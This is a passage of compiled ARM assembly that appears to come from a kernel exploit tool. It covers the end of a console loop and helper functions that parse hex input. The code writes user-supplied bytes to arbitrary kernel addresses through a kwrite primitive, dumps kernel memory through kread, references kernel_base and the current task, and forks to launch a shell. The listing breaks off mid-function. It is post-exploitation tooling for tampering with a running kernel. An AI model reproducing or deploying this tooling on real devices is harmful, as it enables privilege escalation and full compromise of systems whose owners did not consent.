.LBB13_18:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	cmp	r0, #0
	beq	.LBB13_27
	b	.LBB13_19
.LBB13_19:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	ldr	r1, .LCPI13_26
.LPC13_22:
	add	r1, pc, r1
	bl	strcmp
	cmp	r0, #0
	bne	.LBB13_27
	b	.LBB13_20
.LBB13_20:                              @   in Loop: Header=BB13_1 Depth=1
	mov	r0, #0
	str	r0, [r11, #-36]
	ldr	r1, .LCPI13_27
.LPC13_23:
	add	r1, pc, r1
	bl	strtok
	sub	r1, r11, #8
	bl	con_parse_hexstring
	cmp	r0, #0
	beq	.LBB13_26
	b	.LBB13_21
.LBB13_21:                              @   in Loop: Header=BB13_1 Depth=1
	sub	r0, r11, #32
	sub	r1, r11, #36
	sub	r2, r11, #12
	bl	con_parse_hexbytes
	cmp	r0, #0
	beq	.LBB13_26
	b	.LBB13_22
.LBB13_22:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-12]
	cmp	r0, #0
	beq	.LBB13_26
	b	.LBB13_23
.LBB13_23:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-12]
	cmp	r0, #4096
	bhi	.LBB13_26
	b	.LBB13_24
.LBB13_24:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-12]
	sub	r0, r0, #1
	ldr	r1, [r11, #-8]
	ldr	r2, [r11, #-4]
	mvn	r2, r2
	mvn	r1, r1
	subs	r0, r1, r0
	sbcs	r1, r2, #0
	blo	.LBB13_26
	b	.LBB13_25
.LBB13_25:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-8]
	ldr	r1, [r11, #-4]
	ldr	r2, [r11, #-36]
	ldr	r3, [r11, #-12]
	bl	kwrite
	mov	r0, #1
	str	r0, [r11, #-28]
	b	.LBB13_26
.LBB13_26:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-36]
	bl	free
	b	.LBB13_51
.LBB13_27:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	cmp	r0, #0
	beq	.LBB13_40
	b	.LBB13_28
.LBB13_28:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	ldr	r1, .LCPI13_28
.LPC13_24:
	add	r1, pc, r1
	bl	strcmp
	cmp	r0, #0
	bne	.LBB13_40
	b	.LBB13_29
.LBB13_29:                              @   in Loop: Header=BB13_1 Depth=1
	sub	r0, r11, #32
	bl	con_consume
	cmp	r0, #0
	beq	.LBB13_40
	b	.LBB13_30
.LBB13_30:                              @   in Loop: Header=BB13_1 Depth=1
	bl	fork
	ldr	r1, .LCPI13_29
.LPC13_25:
	add	r1, pc, r1
	str	r0, [r1]
	ldr	r0, .LCPI13_30
.LPC13_26:
	ldr	r0, [pc, r0]
	cmn	r0, #1
	bne	.LBB13_32
	b	.LBB13_31
.LBB13_31:
	ldr	r1, .LCPI13_31
.LPC13_27:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB13_32:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, .LCPI13_32
.LPC13_28:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	bne	.LBB13_34
	b	.LBB13_33
.LBB13_33:                              @   in Loop: Header=BB13_1 Depth=1
	bl	launch_shell
	b	.LBB13_34
.LBB13_34:                              @   in Loop: Header=BB13_1 Depth=1
	b	.LBB13_35
.LBB13_35:                              @   Parent Loop BB13_1 Depth=1
                                        @ =>  This Inner Loop Header: Depth=2
	ldr	r0, .LCPI13_33
.LPC13_29:
	ldr	r0, [pc, r0]
	sub	r1, r11, #40
	mov	r2, #2
	bl	waitpid
	b	.LBB13_36
.LBB13_36:                              @   in Loop: Header=BB13_35 Depth=2
	mov	r0, #0
	ldrb	r1, [r11, #-40]
	tst	r1, #127
	str	r0, [sp]                @ 4-byte Spill
	beq	.LBB13_38
	b	.LBB13_37
.LBB13_37:                              @   in Loop: Header=BB13_35 Depth=2
	ldr	r0, [r11, #-40]
	add	r0, r0, #1
	and	r0, r0, #127
	mov	r1, #0
	cmp	r0, #2
	movlt	r1, #1
	str	r1, [sp]                @ 4-byte Spill
	b	.LBB13_38
.LBB13_38:                              @   in Loop: Header=BB13_35 Depth=2
	ldr	r0, [sp]                @ 4-byte Reload
	tst	r0, #1
	bne	.LBB13_35
	b	.LBB13_39
.LBB13_39:                              @   in Loop: Header=BB13_1 Depth=1
	mov	r0, #1
	str	r0, [r11, #-28]
	b	.LBB13_50
.LBB13_40:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	cmp	r0, #0
	beq	.LBB13_44
	b	.LBB13_41
.LBB13_41:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	ldr	r1, .LCPI13_34
.LPC13_30:
	add	r1, pc, r1
	bl	strcmp
	cmp	r0, #0
	bne	.LBB13_44
	b	.LBB13_42
.LBB13_42:                              @   in Loop: Header=BB13_1 Depth=1
	sub	r0, r11, #32
	bl	con_consume
	cmp	r0, #0
	beq	.LBB13_44
	b	.LBB13_43
.LBB13_43:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, .LCPI13_35
.LPC13_31:
	add	r0, pc, r0
	bl	printf
	mov	r1, #1
	str	r1, [r11, #-28]
	b	.LBB13_49
.LBB13_44:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	cmp	r0, #0
	beq	.LBB13_48
	b	.LBB13_45
.LBB13_45:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	ldr	r1, .LCPI13_36
.LPC13_32:
	add	r1, pc, r1
	bl	strcmp
	cmp	r0, #0
	bne	.LBB13_48
	b	.LBB13_46
.LBB13_46:                              @   in Loop: Header=BB13_1 Depth=1
	sub	r0, r11, #32
	bl	con_consume
	cmp	r0, #0
	beq	.LBB13_48
	b	.LBB13_47
.LBB13_47:                              @   in Loop: Header=BB13_1 Depth=1
	mov	r0, #0
	str	r0, [r11, #-16]
	mov	r0, #1
	str	r0, [r11, #-28]
	b	.LBB13_48
.LBB13_48:                              @   in Loop: Header=BB13_1 Depth=1
	b	.LBB13_49
.LBB13_49:                              @   in Loop: Header=BB13_1 Depth=1
	b	.LBB13_50
.LBB13_50:                              @   in Loop: Header=BB13_1 Depth=1
	b	.LBB13_51
.LBB13_51:                              @   in Loop: Header=BB13_1 Depth=1
	b	.LBB13_52
.LBB13_52:                              @   in Loop: Header=BB13_1 Depth=1
	b	.LBB13_53
.LBB13_53:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-28]
	cmp	r0, #0
	bne	.LBB13_55
	b	.LBB13_54
.LBB13_54:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, .LCPI13_37
.LPC13_33:
	add	r0, pc, r0
	bl	printf
	b	.LBB13_55
.LBB13_55:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-20]
	bl	free
	b	.LBB13_1
.LBB13_56:
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.57:
.LCPI13_0:
	.long	33707984                @ 0x20257d0
.LCPI13_1:
	.long	33747656                @ 0x202f2c8
.LCPI13_2:
	.long	33961856                @ 0x2063780
.LCPI13_3:
	.long	37545128                @ 0x23ce4a8
.LCPI13_4:
	.long	.L.str.32-(.LPC13_0+8)
.LCPI13_5:
.Ltmp1:
	.long	stdin(GOT_PREL)-((.LPC13_1+8)-.Ltmp1)
.LCPI13_6:
	.long	.L.str.33-(.LPC13_2+8)
.LCPI13_7:
	.long	.L.str.34-(.LPC13_3+8)
.LCPI13_8:
	.long	.L.str.35-(.LPC13_4+8)
.LCPI13_9:
	.long	kernel_base-(.LPC13_5+8)
.LCPI13_10:
	.long	kernel_base-(.LPC13_6+8)
.LCPI13_11:
	.long	.L.str.36-(.LPC13_7+8)
.LCPI13_12:
	.long	kernel_base-(.LPC13_8+8)
.LCPI13_13:
	.long	.L.str.37-(.LPC13_9+8)
.LCPI13_14:
	.long	kernel_base-(.LPC13_10+8)
.LCPI13_15:
	.long	.L.str.38-(.LPC13_11+8)
.LCPI13_16:
	.long	kernel_base-(.LPC13_12+8)
.LCPI13_17:
	.long	.L.str.39-(.LPC13_13+8)
.LCPI13_18:
	.long	kernel_base-(.LPC13_14+8)
.LCPI13_19:
	.long	.L.str.40-(.LPC13_15+8)
.LCPI13_20:
	.long	current-(.LPC13_16+8)
.LCPI13_21:
	.long	current-(.LPC13_17+8)
.LCPI13_22:
	.long	.L.str.41-(.LPC13_18+8)
.LCPI13_23:
	.long	.L.str.42-(.LPC13_19+8)
.LCPI13_24:
	.long	.L.str.34-(.LPC13_20+8)
.LCPI13_25:
	.long	.L.str.34-(.LPC13_21+8)
.LCPI13_26:
	.long	.L.str.43-(.LPC13_22+8)
.LCPI13_27:
	.long	.L.str.34-(.LPC13_23+8)
.LCPI13_28:
	.long	.L.str.44-(.LPC13_24+8)
.LCPI13_29:
	.long	pid-(.LPC13_25+8)
.LCPI13_30:
	.long	pid-(.LPC13_26+8)
.LCPI13_31:
	.long	.L.str.15-(.LPC13_27+8)
.LCPI13_32:
	.long	pid-(.LPC13_28+8)
.LCPI13_33:
	.long	pid-(.LPC13_29+8)
.LCPI13_34:
	.long	.L.str.45-(.LPC13_30+8)
.LCPI13_35:
	.long	.L.str.46-(.LPC13_31+8)
.LCPI13_36:
	.long	.L.str.47-(.LPC13_32+8)
.LCPI13_37:
	.long	.L.str.48-(.LPC13_33+8)
.Lfunc_end13:
	.size	con_loop, .Lfunc_end13-con_loop
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	con_consume             @ -- Begin function con_consume
	.p2align	2
	.type	con_consume,%function
	.code	32                      @ @con_consume
con_consume:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#8
	sub	sp, sp, #8
	str	r0, [sp, #4]
	mov	r0, #1
	str	r0, [sp]
	b	.LBB14_1
.LBB14_1:                               @ =>This Inner Loop Header: Depth=1
	ldr	r1, .LCPI14_0
.LPC14_0:
	add	r1, pc, r1
	mov	r0, #0
	bl	strtok
	ldr	r1, [sp, #4]
	str	r0, [r1]
	cmp	r0, #0
	beq	.LBB14_3
	b	.LBB14_2
.LBB14_2:                               @   in Loop: Header=BB14_1 Depth=1
	mov	r0, #0
	str	r0, [sp]
	b	.LBB14_3
.LBB14_3:                               @   in Loop: Header=BB14_1 Depth=1
	b	.LBB14_4
.LBB14_4:                               @   in Loop: Header=BB14_1 Depth=1
	ldr	r0, [sp, #4]
	ldr	r0, [r0]
	cmp	r0, #0
	bne	.LBB14_1
	b	.LBB14_5
.LBB14_5:
	ldr	r0, [sp]
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.6:
.LCPI14_0:
	.long	.L.str.34-(.LPC14_0+8)
.Lfunc_end14:
	.size	con_consume, .Lfunc_end14-con_consume
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	con_parse_hexstring     @ -- Begin function con_parse_hexstring
	.p2align	2
	.type	con_parse_hexstring,%function
	.code	32                      @ @con_parse_hexstring
con_parse_hexstring:
	.fnstart
@ %bb.0:
	.pad	#12
	sub	sp, sp, #12
	str	r0, [sp, #4]
	str	r1, [sp]
	ldr	r0, [sp, #4]
	cmp	r0, #0
	beq	.LBB15_2
	b	.LBB15_1
.LBB15_1:
	ldr	r0, [sp, #4]
	ldrb	r0, [r0]
	cmp	r0, #0
	bne	.LBB15_3
	b	.LBB15_2
.LBB15_2:
	mov	r0, #0
	str	r0, [sp, #8]
	b	.LBB15_22
.LBB15_3:
	ldr	r0, [sp]
	mov	r1, #0
	str	r1, [r0, #4]
	str	r1, [r0]
	b	.LBB15_4
.LBB15_4:                               @ =>This Inner Loop Header: Depth=1
	ldr	r0, [sp, #4]
	ldrb	r0, [r0]
	cmp	r0, #0
	beq	.LBB15_21
	b	.LBB15_5
.LBB15_5:                               @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp]
	ldrb	r0, [r0, #7]
	tst	r0, #240
	beq	.LBB15_7
	b	.LBB15_6
.LBB15_6:
	mov	r0, #0
	str	r0, [sp, #8]
	b	.LBB15_22
.LBB15_7:                               @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp, #4]
	ldrb	r0, [r0]
	cmp	r0, #48
	blt	.LBB15_10
	b	.LBB15_8
.LBB15_8:                               @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp, #4]
	ldrb	r0, [r0]
	cmp	r0, #57
	bgt	.LBB15_10
	b	.LBB15_9
.LBB15_9:                               @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp]
	ldr	r1, [r0]
	ldr	r2, [r0, #4]
	lsl	r2, r2, #4
	orr	r2, r2, r1, lsr #28
	ldr	r3, [sp, #4]
	ldrb	r3, [r3]
	adds	r1, r3, r1, lsl #4
	adc	r2, r2, #0
	subs	r1, r1, #48
	sbc	r2, r2, #0
	str	r1, [r0]
	str	r2, [r0, #4]
	b	.LBB15_19
.LBB15_10:                              @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp, #4]
	ldrb	r0, [r0]
	cmp	r0, #97
	blt	.LBB15_13
	b	.LBB15_11
.LBB15_11:                              @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp, #4]
	ldrb	r0, [r0]
	cmp	r0, #102
	bgt	.LBB15_13
	b	.LBB15_12
.LBB15_12:                              @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp]
	ldr	r1, [r0]
	ldr	r2, [r0, #4]
	lsl	r2, r2, #4
	orr	r2, r2, r1, lsr #28
	ldr	r3, [sp, #4]
	ldrb	r3, [r3]
	adds	r1, r3, r1, lsl #4
	adc	r2, r2, #0
	subs	r1, r1, #87
	sbc	r2, r2, #0
	str	r1, [r0]
	str	r2, [r0, #4]
	b	.LBB15_18
.LBB15_13:                              @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp, #4]
	ldrb	r0, [r0]
	cmp	r0, #65
	blt	.LBB15_16
	b	.LBB15_14
.LBB15_14:                              @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp, #4]
	ldrb	r0, [r0]
	cmp	r0, #70
	bgt	.LBB15_16
	b	.LBB15_15
.LBB15_15:                              @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp]
	ldr	r1, [r0]
	ldr	r2, [r0, #4]
	lsl	r2, r2, #4
	orr	r2, r2, r1, lsr #28
	ldr	r3, [sp, #4]
	ldrb	r3, [r3]
	adds	r1, r3, r1, lsl #4
	adc	r2, r2, #0
	subs	r1, r1, #55
	sbc	r2, r2, #0
	str	r1, [r0]
	str	r2, [r0, #4]
	b	.LBB15_17
.LBB15_16:
	mov	r0, #0
	str	r0, [sp, #8]
	b	.LBB15_22
.LBB15_17:                              @   in Loop: Header=BB15_4 Depth=1
	b	.LBB15_18
.LBB15_18:                              @   in Loop: Header=BB15_4 Depth=1
	b	.LBB15_19
.LBB15_19:                              @   in Loop: Header=BB15_4 Depth=1
	b	.LBB15_20
.LBB15_20:                              @   in Loop: Header=BB15_4 Depth=1
	ldr	r0, [sp, #4]
	add	r0, r0, #1
	str	r0, [sp, #4]
	b	.LBB15_4
.LBB15_21:
	mov	r0, #1
	str	r0, [sp, #8]
	b	.LBB15_22
.LBB15_22:
	ldr	r0, [sp, #8]
	add	sp, sp, #12
	bx	lr
.Lfunc_end15:
	.size	con_parse_hexstring, .Lfunc_end15-con_parse_hexstring
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	con_parse_number        @ -- Begin function con_parse_number
	.p2align	2
	.type	con_parse_number,%function
	.code	32                      @ @con_parse_number
con_parse_number:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#16
	sub	sp, sp, #16
	str	r0, [sp, #8]
	str	r1, [sp, #4]
	ldr	r0, [sp, #8]
	cmp	r0, #0
	beq	.LBB16_2
	b	.LBB16_1
.LBB16_1:
	ldr	r0, [sp, #8]
	ldrb	r0, [r0]
	cmp	r0, #0
	bne	.LBB16_3
	b	.LBB16_2
.LBB16_2:
	mov	r0, #0
	str	r0, [r11, #-4]
	b	.LBB16_16
.LBB16_3:
	ldr	r0, [sp, #8]
	ldrb	r0, [r0]
	cmp	r0, #48
	bne	.LBB16_7
	b	.LBB16_4
.LBB16_4:
	ldr	r0, [sp, #8]
	ldrb	r0, [r0, #1]
	cmp	r0, #120
	beq	.LBB16_6
	b	.LBB16_5
.LBB16_5:
	ldr	r0, [sp, #8]
	ldrb	r0, [r0, #1]
	cmp	r0, #88
	bne	.LBB16_7
	b	.LBB16_6
.LBB16_6:
	ldr	r0, [sp, #8]
	add	r0, r0, #2
	ldr	r1, [sp, #4]
	bl	con_parse_hexstring
	str	r0, [r11, #-4]
	b	.LBB16_16
.LBB16_7:
	ldr	r0, [sp, #4]
	mov	r1, #0
	str	r1, [r0, #4]
	str	r1, [r0]
	b	.LBB16_8
.LBB16_8:                               @ =>This Inner Loop Header: Depth=1
	ldr	r0, [sp, #8]
	ldrb	r0, [r0]
	cmp	r0, #0
	beq	.LBB16_15
	b	.LBB16_9
.LBB16_9:                               @   in Loop: Header=BB16_8 Depth=1
	ldr	r0, [sp, #8]
	ldrb	r0, [r0]
	cmp	r0, #48
	blt	.LBB16_11
	b	.LBB16_10
.LBB16_10:                              @   in Loop: Header=BB16_8 Depth=1
	ldr	r0, [sp, #8]
	ldrb	r0, [r0]
	cmp	r0, #58
	blt	.LBB16_12
	b	.LBB16_11
.LBB16_11:
	mov	r0, #0
	str	r0, [r11, #-4]
	b	.LBB16_16
.LBB16_12:                              @   in Loop: Header=BB16_8 Depth=1
	ldr	r0, [sp, #4]
	ldr	r1, [r0]
	ldr	r2, [r0, #4]
	add	r2, r2, r2, lsl #2
	lsl	r2, r2, #1
	ldr	r3, [sp, #8]
	ldrb	r3, [r3]
	mov	r12, #10
	umlal	r3, r2, r1, r12
	subs	r1, r3, #48
	sbc	r2, r2, #0
	str	r1, [r0]
	str	r2, [r0, #4]
	ldr	r0, [sp, #4]
	ldr	r1, [r0]
	ldr	r0, [r0, #4]
	mov	r2, #1
	orr	r2, r2, #4096
	subs	r1, r1, r2
	sbcs	r0, r0, #0
	blo	.LBB16_14
	b	.LBB16_13
.LBB16_13:
	mov	r0, #0
	str	r0, [r11, #-4]
	b	.LBB16_16
.LBB16_14:                              @   in Loop: Header=BB16_8 Depth=1
	ldr	r0, [sp, #8]
	add	r0, r0, #1
	str	r0, [sp, #8]
	b	.LBB16_8
.LBB16_15:
	mov	r0, #1
	str	r0, [r11, #-4]
	b	.LBB16_16
.LBB16_16:
	ldr	r0, [r11, #-4]
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
.Lfunc_end16:
	.size	con_parse_number, .Lfunc_end16-con_parse_number
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	con_kdump               @ -- Begin function con_kdump
	.p2align	2
	.type	con_kdump,%function
	.code	32                      @ @con_kdump
con_kdump:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#48
	sub	sp, sp, #48
	mov	r3, r1
	mov	r12, r0
	str	r1, [r11, #-4]
	str	r0, [r11, #-8]
	str	r2, [r11, #-12]
	ldr	r0, [r11, #-12]
	cmp	r0, #0
	bne	.LBB17_2
	b	.LBB17_1
.LBB17_1:
	b	.LBB17_20
.LBB17_2:
	ldr	r0, [r11, #-12]
	bl	malloc
	str	r0, [r11, #-16]
	ldr	r0, [r11, #-16]
	cmp	r0, #0
	bne	.LBB17_4
	b	.LBB17_3
.LBB17_3:
	ldr	r1, .LCPI17_0
.LPC17_0:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB17_4:
	ldr	r0, [r11, #-8]
	ldr	r1, [r11, #-4]
	ldr	r2, [r11, #-16]
	ldr	r3, [r11, #-12]
	bl	kread
	mov	r0, #0
	str	r0, [sp, #28]
	str	r0, [sp, #24]
	b	.LBB17_5
.LBB17_5:                               @ =>This Loop Header: Depth=1
                                        @     Child Loop BB17_7 Depth 2
	ldr	r0, [sp, #24]
	ldr	r1, [sp, #28]
	ldr	r2, [r11, #-12]
	subs	r0, r0, r2
	sbcs	r1, r1, #0
	bhs	.LBB17_19
	b	.LBB17_6
.LBB17_6:                               @   in Loop: Header=BB17_5 Depth=1
	ldr	r0, .LCPI17_1
.LPC17_1:
	add	r0, pc, r0
	str	r0, [sp, #20]
	mov	r0, #0
	str	r0, [sp, #16]
	b	.LBB17_7
.LBB17_7:                               @   Parent Loop BB17_5 Depth=1
                                        @ =>  This Inner Loop Header: Depth=2
	ldr	r0, [sp, #16]
	cmp	r0, #15
	bhi	.LBB17_17
	b	.LBB17_8
.LBB17_8:                               @   in Loop: Header=BB17_7 Depth=2
	ldr	r0, [sp, #16]
	ldr	r1, [sp, #24]
	ldr	r2, [sp, #28]
	adds	r0, r0, r1
	adc	r1, r2, #0
	ldr	r2, [r11, #-12]
	subs	r0, r0, r2
	sbcs	r1, r1, #0
	bhs	.LBB17_14
	b	.LBB17_9
.LBB17_9:                               @   in Loop: Header=BB17_7 Depth=2
	ldr	r0, [r11, #-16]
	ldr	r1, [sp, #16]
	ldr	r2, [sp, #24]
	add	r1, r1, r2
	ldrb	r0, [r0, r1]
	strb	r0, [sp, #15]
	ldr	r0, [sp, #20]
	ldr	r1, [sp, #16]
	ldr	r2, .LCPI17_2
.LPC17_2:
	add	r2, pc, r2
	ldr	r3, .LCPI17_3
.LPC17_3:
	add	r3, pc, r3
	tst	r1, #1
	movne	r3, r2
	ldrb	r2, [sp, #15]
	mov	r1, r3
	bl	sprintf
	ldr	r1, [sp, #20]
	add	r0, r1, r0
	str	r0, [sp, #20]
	ldrb	r0, [sp, #15]
	cmp	r0, #32
	blt	.LBB17_12
	b	.LBB17_10
.LBB17_10:                              @   in Loop: Header=BB17_7 Depth=2
	ldrb	r0, [sp, #15]
	cmp	r0, #126
	bgt	.LBB17_12
	b	.LBB17_11
.LBB17_11:                              @   in Loop: Header=BB17_7 Depth=2
	ldrb	r0, [sp, #15]
	str	r0, [sp, #8]            @ 4-byte Spill
	b	.LBB17_13
.LBB17_12:                              @   in Loop: Header=BB17_7 Depth=2
	mov	r0, #46
	str	r0, [sp, #8]            @ 4-byte Spill
	b	.LBB17_13
.LBB17_13:                              @   in Loop: Header=BB17_7 Depth=2
	ldr	r0, [sp, #8]            @ 4-byte Reload
	ldr	r1, [sp, #16]
	ldr	r2, .LCPI17_4
.LPC17_4:
	add	r2, pc, r2
	strb	r0, [r2, r1]
	b	.LBB17_15
.LBB17_14:                              @   in Loop: Header=BB17_7 Depth=2
	ldr	r0, [sp, #20]
	ldr	r1, [sp, #16]
	ldr	r2, .LCPI17_5
.LPC17_5:
	add	r2, pc, r2
	ldr	r3, .LCPI17_6
.LPC17_6:
	add	r3, pc, r3
	tst	r1, #1
	movne	r3, r2
	mov	r1, r3
	bl	sprintf
	ldr	r1, [sp, #20]
	add	r0, r1, r0
	str	r0, [sp, #20]
	ldr	r0, [sp, #16]
	ldr	r1, .LCPI17_7
.LPC17_7:
	add	r1, pc, r1
	mov	r2, #32
	strb	r2, [r1, r0]
	b	.LBB17_15
.LBB17_15:                              @   in Loop: Header=BB17_7 Depth=2
	b	.LBB17_16
.LBB17_16:                              @   in Loop: Header=BB17_7 Depth=2
	ldr	r0, [sp, #16]
	add	r0, r0, #1
	str	r0, [sp, #16]
	b	.LBB17_7
.LBB17_17:                              @   in Loop: Header=BB17_5 Depth=1
	ldr	r0, [r11, #-8]
	ldr	r1, [r11, #-4]
	ldr	r2, [sp, #24]
	ldr	r3, [sp, #28]
	adds	r2, r0, r2
	adc	r3, r1, r3
	ldr	r0, .LCPI17_8
.LPC17_8:
	add	r0, pc, r0
	mov	r1, sp
	str	r0, [r1, #4]
	ldr	r0, .LCPI17_9
.LPC17_9:
	add	r0, pc, r0
	str	r0, [r1]
	ldr	r0, .LCPI17_10
.LPC17_10:
	add	r0, pc, r0
	bl	printf
	b	.LBB17_18
.LBB17_18:                              @   in Loop: Header=BB17_5 Depth=1
	ldr	r0, [sp, #24]
	ldr	r1, [sp, #28]
	adds	r0, r0, #16
	adc	r1, r1, #0
	str	r0, [sp, #24]
	str	r1, [sp, #28]
	b	.LBB17_5
.LBB17_19:
	ldr	r0, [r11, #-16]
	bl	free
	b	.LBB17_20
.LBB17_20:
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.21:
.LCPI17_0:
	.long	.L.str.49-(.LPC17_0+8)
.LCPI17_1:
	.long	con_kdump.line-(.LPC17_1+8)
.LCPI17_2:
	.long	.L.str.50-(.LPC17_2+8)
.LCPI17_3:
	.long	.L.str.51-(.LPC17_3+8)
.LCPI17_4:
	.long	con_kdump.text-(.LPC17_4+8)
.LCPI17_5:
	.long	.L.str.52-(.LPC17_5+8)
.LCPI17_6:
	.long	.L.str.53-(.LPC17_6+8)
.LCPI17_7:
	.long	con_kdump.text-(.LPC17_7+8)
.LCPI17_8:
	.long	con_kdump.text-(.LPC17_8+8)
.LCPI17_9:
	.long	con_kdump.line-(.LPC17_9+8)
.LCPI17_10:
	.long	.L.str.54-(.LPC17_10+8)
.Lfunc_end17:
	.size	con_kdump, .Lfunc_end17-con_kdump
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	con_parse_hexbytes      @ -- Begin function con_parse_hexbytes
	.p2align	2
	.type	con_parse_hexbytes,%function
	.code	32                      @ @con_parse_hexbytes
con_parse_hexbytes:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#48
	sub	sp, sp, #48
	str	r0, [r11, #-8]
	str	r1, [r11, #-12]
	str	r2, [r11, #-16]
	mov	r0, #4096
	bl	malloc
	str	r0, [r11, #-20]
	ldr	r0, [r11, #-20]
	cmp	r0, #0
	bne	.LBB18_2
	b	.LBB18_1
.LBB18_1:
	ldr	r1, .LCPI18_0
.LPC18_0:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB18_2:
	ldr	r0, [r11, #-20]
	ldr	r1, [r11, #-12]
	str	r0, [r1]
	ldr	r0, [r11, #-16]
	mov	r1, #0
	str	r1, [r0]
	str	r1, [sp, #24]
	b	.LBB18_3
.LBB18_3:                               @ =>This Loop Header: Depth=1
                                        @     Child Loop BB18_5 Depth 2
	ldr	r1, .LCPI18_1
.LPC18_1:
	add	r1, pc, r1
	mov	r0, #0
	bl	strtok
	ldr	r1, [r11, #-8]
	str	r0, [r1]
	cmp	r0, #0
	beq	.LBB18_16
	b	.LBB18_4
.LBB18_4:                               @   in Loop: Header=BB18_3 Depth=1
	ldr	r0, [r11, #-8]
	ldr	r0, [r0]
	str	r0, [sp, #20]
	b	.LBB18_5
.LBB18_5:                               @   Parent Loop BB18_3 Depth=1
                                        @ =>  This Inner Loop Header: Depth=2
	ldr	r0, [sp, #20]
	ldrb	r0, [r0]
	cmp	r0, #0
	beq	.LBB18_15
	b	.LBB18_6
.LBB18_6:                               @   in Loop: Header=BB18_5 Depth=2
	ldr	r0, [sp, #20]
	ldrb	r0, [r0]
	bl	isxdigit
	cmp	r0, #0
	bne	.LBB18_8
	b	.LBB18_7
.LBB18_7:
	mov	r0, #0
	str	r0, [r11, #-4]
	b	.LBB18_19
.LBB18_8:                               @   in Loop: Header=BB18_5 Depth=2
	ldr	r0, [sp, #20]
	ldrb	r0, [r0]
	ldr	r1, [sp, #24]
	add	r2, r1, #1
	str	r2, [sp, #24]
	ldr	r2, .LCPI18_2
.LPC18_2:
	add	r2, pc, r2
	strb	r0, [r2, r1]
	ldr	r0, [sp, #24]
	cmp	r0, #2
	bne	.LBB18_13
	b	.LBB18_9
.LBB18_9:                               @   in Loop: Header=BB18_5 Depth=2
	mov	r0, #0
	str	r0, [sp, #24]
	ldr	r0, [r11, #-16]
	ldr	r0, [r0]
	cmp	r0, #4096
	beq	.LBB18_11
	b	.LBB18_10
.LBB18_10:                              @   in Loop: Header=BB18_5 Depth=2
	ldr	r0, .LCPI18_3
.LPC18_3:
	add	r0, pc, r0
	add	r1, sp, #8
	bl	con_parse_hexstring
	cmp	r0, #0
	bne	.LBB18_12
	b	.LBB18_11
.LBB18_11:
	mov	r0, #0
	str	r0, [r11, #-4]
	b	.LBB18_19
.LBB18_12:                              @   in Loop: Header=BB18_5 Depth=2
	ldrb	r0, [sp, #8]
	ldr	r1, [r11, #-20]
	ldr	r2, [r11, #-16]
	ldr	r3, [r2]
	add	r12, r3, #1
	str	r12, [r2]
	strb	r0, [r1, r3]
	b	.LBB18_13
.LBB18_13:                              @   in Loop: Header=BB18_5 Depth=2
	b	.LBB18_14
.LBB18_14:                              @   in Loop: Header=BB18_5 Depth=2
	ldr	r0, [sp, #20]
	add	r0, r0, #1
	str	r0, [sp, #20]
	b	.LBB18_5
.LBB18_15:                              @   in Loop: Header=BB18_3 Depth=1
	b	.LBB18_3
.LBB18_16:
	ldr	r0, [r11, #-16]
	ldr	r0, [r0]
	mov	r1, #0
	cmp	r0, #0
	str	r1, [sp, #4]            @ 4-byte Spill
	beq	.LBB18_18
	b	.LBB18_17
.LBB18_17:
	ldr	r0, [sp, #24]
	rsbs	r1, r0, #0
	adc	r0, r0, r1
	str	r0, [sp, #4]            @ 4-byte Spill
	b	.LBB18_18
.LBB18_18:
	ldr	r0, [sp, #4]            @ 4-byte Reload
	and	r0, r0, #1
